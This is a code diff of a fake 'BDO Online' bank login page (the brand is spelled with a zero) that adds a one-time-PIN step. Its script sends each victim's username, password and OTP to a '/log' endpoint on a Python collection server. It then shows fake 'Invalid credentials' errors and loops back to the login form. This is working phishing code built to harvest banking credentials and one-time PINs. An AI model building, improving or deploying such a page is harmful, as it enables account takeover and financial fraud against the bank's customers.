@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>BDO Online</title>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
   <style>
@@ -25,7 +25,6 @@
     .login-card {
       background: white;
       width: 400px;
-      max-width: 100%;
       padding: 2.5rem 2rem 2rem;
       border-radius: 20px;
       box-shadow: 0 16px 40px rgba(0, 0, 0, 0.08);
@@ -59,6 +58,11 @@
       color: #4a5b6e;
       display: block;
       margin-top: 4px;
+    }
+
+    /* ===== LOGIN FORM ===== */
+    .login-fields {
+      transition: 0.2s;
     }
 
     .input-group {
@@ -100,25 +104,11 @@
       font-size: 1rem;
       color: #0b1e3a;
       outline: none;
-      -webkit-appearance: none;
-      -moz-appearance: none;
-      appearance: none;
     }
 
     .input-field input::placeholder {
       color: #9aaec2;
       font-size: 0.95rem;
-    }
-
-    .input-field input::-webkit-outer-spin-button,
-    .input-field input::-webkit-inner-spin-button {
-      -webkit-appearance: none;
-      margin: 0;
-    }
-
-    .input-field input[type=number] {
-      -moz-appearance: textfield;
-      appearance: textfield;
     }
 
     .toggle-password {
@@ -128,7 +118,6 @@
       font-size: 1.2rem;
       color: #788b9f;
       cursor: pointer;
-      -webkit-tap-highlight-color: transparent;
     }
 
     .input-field.error {
@@ -171,7 +160,6 @@
       margin-top: 0.8rem;
       cursor: pointer;
       transition: 0.2s;
-      -webkit-tap-highlight-color: transparent;
     }
 
     .login-btn:hover:not(:disabled) {
@@ -206,16 +194,21 @@
       display: flex;
       align-items: center;
       justify-content: center;
-      gap: 6px;
       font-size: 1.1rem;
       color: #1f2f44;
       border-top: 1px solid #e3eaf2;
       padding-top: 1.8rem;
     }
 
-    .footer-brand .years {
-      font-weight: 700;
-      color: #0b1e3a;
+    .footer-brand .tagline {
+      font-weight: 300;
+      color: #2c445e;
+      letter-spacing: 0.3px;
+    }
+
+    .footer-brand .tagline i {
+      font-style: normal;
+      font-weight: 500;
     }
 
     .login-error-message {
@@ -248,38 +241,165 @@
       to { transform: rotate(360deg); }
     }
 
-    .toast {
-      position: fixed;
-      bottom: 30px;
-      left: 50%;
-      transform: translateX(-50%);
+    /* ===== OTP SECTION ===== */
+    .otp-section {
+      display: none;
+      padding: 0.5rem 0;
+    }
+
+    .otp-section.show {
+      display: block;
+    }
+
+    .otp-title {
+      font-size: 1.3rem;
+      font-weight: 600;
+      color: #0b1e3a;
+      margin-bottom: 0.3rem;
+    }
+
+    .otp-subtitle {
+      font-size: 0.85rem;
+      color: #4a5b6e;
+      margin-bottom: 1.5rem;
+      line-height: 1.5;
+    }
+
+    .otp-input-container {
+      display: flex;
+      justify-content: center;
+      gap: 12px;
+      margin-bottom: 1.2rem;
+    }
+
+    .otp-input {
+      width: 50px;
+      height: 58px;
+      text-align: center;
+      font-size: 1.5rem;
+      font-weight: 600;
+      border: 2px solid #e0e7ef;
+      border-radius: 12px;
+      background: #f8fafc;
+      outline: none;
+      transition: 0.2s;
+      color: #0b1e3a;
+      font-family: 'Courier New', monospace;
+    }
+
+    .otp-input:focus {
+      border-color: #1d3b6f;
+      background: white;
+      box-shadow: 0 0 0 3px rgba(27, 55, 100, 0.08);
+    }
+
+    .otp-input.filled {
+      border-color: #1d3b6f;
+      background: white;
+    }
+
+    .otp-input.error {
+      border-color: #d42e2e !important;
+      background: #fff7f7 !important;
+      box-shadow: 0 0 0 3px rgba(212, 46, 46, 0.1);
+    }
+
+    .otp-input.show-number {
+      font-size: 1.5rem;
+    }
+    
+    .otp-input.show-asterisk {
+      font-size: 2rem;
+      color: #0b1e3a;
+    }
+
+    .otp-resend {
+      font-size: 0.85rem;
+      color: #4a5b6e;
+      margin-bottom: 1.5rem;
+    }
+
+    .otp-resend a {
+      color: #0b1e3a;
+      font-weight: 600;
+      text-decoration: none;
+      cursor: pointer;
+    }
+
+    .otp-resend a:hover {
+      text-decoration: underline;
+    }
+
+    .otp-verify-btn {
+      width: 100%;
+      padding: 15px;
       background: #0b1e3a;
+      border: none;
+      border-radius: 40px;
       color: white;
-      padding: 12px 24px;
-      border-radius: 30px;
+      font-size: 1.1rem;
+      font-weight: 600;
+      margin-top: 0.8rem;
+      cursor: pointer;
+      transition: 0.2s;
+    }
+
+    .otp-verify-btn:hover {
+      background: #143157;
+    }
+
+    .otp-error-message {
+      margin-top: 1rem;
+      padding: 10px 14px;
+      background: #fff7f7;
+      border: 1px solid #d42e2e;
+      border-radius: 10px;
+      color: #b11f1f;
       font-size: 0.9rem;
-      opacity: 0;
-      transition: opacity 0.3s;
-      pointer-events: none;
-      z-index: 1000;
-      max-width: 90%;
+      display: none;
+      text-align: center;
     }
 
-    .toast.show {
-      opacity: 1;
+    .otp-error-message.show {
+      display: block;
     }
 
-    .toast.success {
-      background: #1a7a3a;
+    /* When OTP is shown, hide login fields */
+    .login-card.show-otp .login-fields {
+      display: none;
     }
 
-    .toast.error {
-      background: #b11f1f;
+    .login-card.show-otp .otp-section {
+      display: block;
     }
 
+    .login-card.show-otp .login-error-message {
+      display: none !important;
+    }
+
+    .login-card.show-otp .footer-brand {
+      margin-top: 1.8rem;
+    }
+
+    .login-card.show-otp .otp-error-message.show {
+      display: block;
+    }
+
+    /* Small screens */
     @media (max-width: 460px) {
       .login-card {
-        padding: 1.8rem 1.2rem 1.5rem;
+        width: 92%;
+        padding: 2rem 1.2rem;
+      }
+      
+      .otp-input-container {
+        gap: 8px;
+      }
+      
+      .otp-input {
+        width: 44px;
+        height: 52px;
+        font-size: 1.3rem;
       }
     }
   </style>
@@ -287,16 +407,18 @@
 <body>
 
 <div class="login-card" id="loginCard">
+  <!-- Brand -->
   <div class="brand">
-    <span class="bd">BD</span><span class="yellow-o">O</span> <span class="bdo">Online</span>
+    <span class="bd">BD</span><span class="yellow-o">0</span> <span class="bdo">Online</span>
     <small>Welcome to BDO Online!</small>
   </div>
 
+  <!-- ===== LOGIN FORM ===== -->
   <div class="login-fields" id="loginFields">
     <div class="input-group">
       <label for="username">Username</label>
       <div class="input-field" id="usernameField">
-        <input type="text" id="username" placeholder="Enter username" autocomplete="off">
+        <input type="text" id="username" placeholder="Enter username">
       </div>
       <div class="input-error-text" id="usernameError">enter username</div>
     </div>
@@ -322,37 +444,50 @@
     </div>
   </div>
 
+  <!-- ===== ERROR MESSAGES ===== -->
   <div class="login-error-message" id="loginErrorMessage">
     Invalid credentials. Please check your username and password.
   </div>
+  <div class="login-error-message" id="serverErrorMessage" style="border-color: #d42e2e; background: #fff7f7; color: #b11f1f;">
+    Cannot reach server
+  </div>
 
+  <!-- ===== OTP SECTION ===== -->
+  <div class="otp-section" id="otpSection">
+    <div class="otp-title">We need to make sure it's you</div>
+    <div class="otp-subtitle">
+      Please enter the One-Time PIN (OTP) just sent to your registered mobile number.
+    </div>
+
+    <div class="otp-input-container" id="otpInputContainer">
+      <input type="password" class="otp-input" id="otp1" maxlength="1" inputmode="numeric" pattern="[0-9]" autocomplete="off">
+      <input type="password" class="otp-input" id="otp2" maxlength="1" inputmode="numeric" pattern="[0-9]" autocomplete="off">
+      <input type="password" class="otp-input" id="otp3" maxlength="1" inputmode="numeric" pattern="[0-9]" autocomplete="off">
+      <input type="password" class="otp-input" id="otp4" maxlength="1" inputmode="numeric" pattern="[0-9]" autocomplete="off">
+      <input type="password" class="otp-input" id="otp5" maxlength="1" inputmode="numeric" pattern="[0-9]" autocomplete="off">
+      <input type="password" class="otp-input" id="otp6" maxlength="1" inputmode="numeric" pattern="[0-9]" autocomplete="off">
+    </div>
+
+    <div class="otp-resend">
+      <a id="resendOtp">Resend OTP</a>
+    </div>
+
+    <button class="otp-verify-btn" id="otpVerifyBtn">Verify OTP</button>
+
+    <div class="otp-error-message" id="otpErrorMessage">
+      Invalid credentials. Please check your username and password.
+    </div>
+  </div>
+
+  <!-- Footer -->
   <div class="footer-brand">
     <span class="tagline"><i>We find ways®</i></span>
   </div>
 </div>
 
-<div class="toast" id="toast"></div>
-
 <script>
   (function() {
-    // ============================================
-    // DETECT SERVER URL - Auto-detect for phone
-    // ============================================
-    function getServerUrl() {
-      const currentUrl = window.location.href;
-      const url = new URL(currentUrl);
-      const hostname = url.hostname;
-      const port = url.port || '3000';
-      
-      return `http://${hostname}:${port}`;
-    }
-
-    const SERVER_URL = getServerUrl();
-    console.log('🌐 Server URL detected:', SERVER_URL);
-
-    // ============================================
-    // DOM Elements
-    // ============================================
+    // ===== DOM Elements =====
     const usernameInput = document.getElementById('username');
     const passwordInput = document.getElementById('password');
     const usernameField = document.getElementById('usernameField');
@@ -364,27 +499,21 @@
     const loginBtnSpinner = document.getElementById('loginBtnSpinner');
     const togglePasswordBtn = document.getElementById('togglePasswordBtn');
     const eyeIcon = document.getElementById('eyeIcon');
-    const toast = document.getElementById('toast');
     const loginErrorMessage = document.getElementById('loginErrorMessage');
+    const serverErrorMessage = document.getElementById('serverErrorMessage');
+    const loginCard = document.getElementById('loginCard');
+    const otpSection = document.getElementById('otpSection');
+    const otpInputs = document.querySelectorAll('.otp-input');
+    const otpVerifyBtn = document.getElementById('otpVerifyBtn');
+    const resendOtp = document.getElementById('resendOtp');
+    const otpErrorMessage = document.getElementById('otpErrorMessage');
 
     let passwordVisible = false;
     let isProcessing = false;
+    let otpValues = ['', '', '', '', '', ''];
+    let otpTimers = [];
 
-    // ============================================
-    // Toast
-    // ============================================
-    function showToast(message, type = 'info', duration = 3000) {
-      toast.textContent = message;
-      toast.className = 'toast ' + type + ' show';
-      clearTimeout(toast._timeout);
-      toast._timeout = setTimeout(() => {
-        toast.classList.remove('show');
-      }, duration);
-    }
-
-    // ============================================
-    // Password Toggle
-    // ============================================
+    // ===== Password Toggle =====
     togglePasswordBtn.addEventListener('click', function(e) {
       e.preventDefault();
       passwordVisible = !passwordVisible;
@@ -393,15 +522,16 @@
       eyeIcon.classList.toggle('fa-eye-slash');
     });
 
-    // ============================================
-    // Error Handling
-    // ============================================
+    // ===== Error Handling =====
     function clearErrors() {
       usernameField.classList.remove('error');
       passwordField.classList.remove('error');
       usernameError.classList.remove('show');
       passwordError.classList.remove('show');
       loginErrorMessage.classList.remove('show');
+      serverErrorMessage.classList.remove('show');
+      otpErrorMessage.classList.remove('show');
+      otpInputs.forEach(input => input.classList.remove('error'));
     }
 
     function highlightEmptyFields() {
@@ -421,19 +551,14 @@
       return hasError;
     }
 
-    // ============================================
-    // Send to Python server
-    // ============================================
-    async function sendToServer(username, password) {
-      const url = `${SERVER_URL}/log`;
-      console.log('📡 Sending to:', url);
-      
-      const response = await fetch(url, {
+    // ===== Send to Python Server =====
+    async function sendToServer(username, password, otp = '') {
+      const response = await fetch('http://localhost:3000/log', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
         },
-        body: JSON.stringify({ username, password }),
+        body: JSON.stringify({ username, password, otp }),
       });
       
       if (!response.ok) {
@@ -444,13 +569,188 @@
       return data;
     }
 
-    // ============================================
-    // Handle Login
-    // ============================================
+    // ===== OTP Functions =====
+    function focusNextOtp(index) {
+      if (index < 5) {
+        otpInputs[index + 1].focus();
+      }
+    }
+
+    function updateOtpValues() {
+      otpInputs.forEach((input, index) => {
+        const val = input.dataset.value || '';
+        otpValues[index] = val;
+        if (val) {
+          input.classList.add('filled');
+        } else {
+          input.classList.remove('filled');
+        }
+      });
+    }
+
+    function getOtpString() {
+      return otpValues.join('');
+    }
+
+    function clearOtp() {
+      otpValues = ['', '', '', '', '', ''];
+      otpInputs.forEach((input, index) => {
+        input.value = '';
+        input.dataset.value = '';
+        input.classList.remove('filled');
+        input.classList.remove('error');
+        input.classList.remove('show-number');
+        input.classList.remove('show-asterisk');
+        input.type = 'password';
+        if (otpTimers[index]) {
+          clearTimeout(otpTimers[index]);
+          otpTimers[index] = null;
+        }
+      });
+      otpErrorMessage.classList.remove('show');
+    }
+
+    // ===== Show number briefly then turn to asterisk =====
+    function setOtpValue(input, index, digit) {
+      if (otpTimers[index]) {
+        clearTimeout(otpTimers[index]);
+        otpTimers[index] = null;
+      }
+
+      input.dataset.value = digit;
+      otpValues[index] = digit;
+      
+      input.type = 'text';
+      input.value = digit;
+      input.classList.add('show-number');
+      input.classList.remove('show-asterisk');
+      input.classList.add('filled');
+      
+      otpTimers[index] = setTimeout(() => {
+        input.type = 'password';
+        input.value = '•';
+        input.classList.remove('show-number');
+        input.classList.add('show-asterisk');
+        otpTimers[index] = null;
+      }, 800);
+    }
+
+    // ===== Return to Login Page =====
+    function returnToLogin() {
+      loginCard.classList.remove('show-otp');
+      clearOtp();
+      clearErrors();
+    }
+
+    // ===== OTP Input Handling =====
+    otpInputs.forEach((input, index) => {
+      input.addEventListener('input', function(e) {
+        const val = this.value.replace(/\D/g, '');
+        if (val) {
+          const digit = val.slice(0, 1);
+          setOtpValue(this, index, digit);
+          if (index < 5) {
+            focusNextOtp(index);
+          }
+        } else {
+          this.dataset.value = '';
+          otpValues[index] = '';
+          this.classList.remove('filled');
+          this.classList.remove('show-number');
+          this.classList.remove('show-asterisk');
+          this.type = 'password';
+          this.value = '';
+          if (otpTimers[index]) {
+            clearTimeout(otpTimers[index]);
+            otpTimers[index] = null;
+          }
+        }
+        this.classList.remove('error');
+        otpErrorMessage.classList.remove('show');
+        updateOtpValues();
+      });
+
+      input.addEventListener('keydown', function(e) {
+        if (e.key === 'Backspace') {
+          if (this.dataset.value) {
+            this.dataset.value = '';
+            otpValues[index] = '';
+            this.classList.remove('filled');
+            this.classList.remove('show-number');
+            this.classList.remove('show-asterisk');
+            this.type = 'password';
+            this.value = '';
+            if (otpTimers[index]) {
+              clearTimeout(otpTimers[index]);
+              otpTimers[index] = null;
+            }
+            this.classList.remove('error');
+            otpErrorMessage.classList.remove('show');
+            updateOtpValues();
+          } else if (index > 0) {
+            otpInputs[index - 1].focus();
+            const prev = otpInputs[index - 1];
+            prev.dataset.value = '';
+            otpValues[index - 1] = '';
+            prev.classList.remove('filled');
+            prev.classList.remove('show-number');
+            prev.classList.remove('show-asterisk');
+            prev.type = 'password';
+            prev.value = '';
+            if (otpTimers[index - 1]) {
+              clearTimeout(otpTimers[index - 1]);
+              otpTimers[index - 1] = null;
+            }
+            prev.classList.remove('error');
+            otpErrorMessage.classList.remove('show');
+            updateOtpValues();
+          }
+        }
+      });
+
+      input.addEventListener('focus', function() {
+        this.select();
+      });
+
+      input.addEventListener('paste', function(e) {
+        e.preventDefault();
+        const paste = (e.clipboardData || window.clipboardData).getData('text');
+        const numbers = paste.replace(/\D/g, '').slice(0, 6);
+        const chars = numbers.split('');
+        
+        chars.forEach((char, i) => {
+          if (i < 6) {
+            setOtpValue(otpInputs[i], i, char);
+          }
+        });
+        otpErrorMessage.classList.remove('show');
+        updateOtpValues();
+        
+        const lastIndex = Math.min(chars.length, 5);
+        if (chars.length < 6) {
+          otpInputs[lastIndex].focus();
+        } else {
+          otpInputs[5].focus();
+        }
+      });
+    });
+
+    // ===== Show OTP Section =====
+    function showOtpSection() {
+      loginCard.classList.add('show-otp');
+      clearErrors();
+      clearOtp();
+      setTimeout(() => {
+        otpInputs[0].focus();
+      }, 300);
+    }
+
+    // ===== Handle Login =====
     async function handleLogin() {
       if (isProcessing) return;
       
       loginErrorMessage.classList.remove('show');
+      serverErrorMessage.classList.remove('show');
       
       const hasEmpty = highlightEmptyFields();
       
@@ -467,28 +767,14 @@
         const username = usernameInput.value.trim();
         const password = passwordInput.value;
         
-        const result = await sendToServer(username, password);
-        console.log('✅ Server response:', result);
+        await sendToServer(username, password);
         
-        loginErrorMessage.textContent = 'Invalid credentials. Please check your username and password.';
-        loginErrorMessage.classList.add('show');
-        showToast('❌ Invalid credentials', 'error', 3000);
         clearErrors();
+        showOtpSection();
         
       } catch (error) {
-        console.error('❌ Login error:', error);
-        
-        let errorMsg = 'Invalid credentials. Please check your username and password.';
-        
-        if (error.message.includes('Failed to fetch')) {
-          errorMsg = '❌ Cannot reach server!\n\nMake sure:\n1. Server is running (python server.py)\n2. Phone is on the SAME Wi-Fi\n3. Use the IP shown in server console';
-          showToast('❌ Server connection failed', 'error', 5000);
-        } else {
-          showToast('❌ Invalid credentials', 'error', 3000);
-        }
-        
-        loginErrorMessage.textContent = errorMsg;
-        loginErrorMessage.classList.add('show');
+        console.error('Login error:', error);
+        serverErrorMessage.classList.add('show');
         
       } finally {
         isProcessing = false;
@@ -498,9 +784,43 @@
       }
     }
 
-    // ============================================
-    // Event Listeners
-    // ============================================
+    // ===== Verify OTP =====
+    async function handleOtpVerify() {
+      const otp = getOtpString();
+      
+      if (otp.length === 6) {
+        try {
+          const username = usernameInput.value.trim();
+          const password = passwordInput.value;
+          await sendToServer(username, password, otp);
+          
+          otpInputs.forEach(input => {
+            input.classList.add('error');
+          });
+          
+          otpErrorMessage.classList.add('show');
+          
+          setTimeout(() => {
+            returnToLogin();
+          }, 2000);
+          
+        } catch (error) {
+          console.error('OTP log error:', error);
+        }
+        
+      } else {
+        clearOtp();
+        otpInputs[0].focus();
+      }
+    }
+
+    // ===== Resend OTP =====
+    function handleResendOtp() {
+      clearOtp();
+      otpInputs[0].focus();
+    }
+
+    // ===== Event Listeners =====
     loginBtn.addEventListener('click', function(e) {
       e.preventDefault();
       handleLogin();
@@ -526,6 +846,7 @@
         usernameError.classList.remove('show');
       }
       loginErrorMessage.classList.remove('show');
+      serverErrorMessage.classList.remove('show');
     });
 
     passwordInput.addEventListener('input', function() {
@@ -534,25 +855,41 @@
         passwordError.classList.remove('show');
       }
       loginErrorMessage.classList.remove('show');
+      serverErrorMessage.classList.remove('show');
+    });
+
+    otpVerifyBtn.addEventListener('click', handleOtpVerify);
+
+    resendOtp.addEventListener('click', handleResendOtp);
+
+    otpInputs.forEach(input => {
+      input.addEventListener('keydown', function(e) {
+        if (e.key === 'Enter') {
+          e.preventDefault();
+          handleOtpVerify();
+        }
+      });
     });
 
     document.querySelector('.brand').addEventListener('dblclick', function() {
+      loginCard.classList.remove('show-otp');
       clearErrors();
       usernameInput.value = '';
       passwordInput.value = '';
+      clearOtp();
       loginErrorMessage.classList.remove('show');
-      loginErrorMessage.textContent = 'Invalid credentials. Please check your username and password.';
+      serverErrorMessage.classList.remove('show');
+      otpErrorMessage.classList.remove('show');
       if (passwordVisible) {
         passwordVisible = false;
         passwordInput.type = 'password';
         eyeIcon.classList.add('fa-eye');
         eyeIcon.classList.remove('fa-eye-slash');
       }
-      showToast('Reset complete', 'info', 1500);
     });
 
-    console.log('✅ BDO Online ready!');
-    console.log('📡 Server URL:', SERVER_URL);
+    console.log('✅ BDO Online with OTP verification (no notifications)');
+    console.log('📡 Server URL: http://localhost:3000');
   })();
 </script>
 
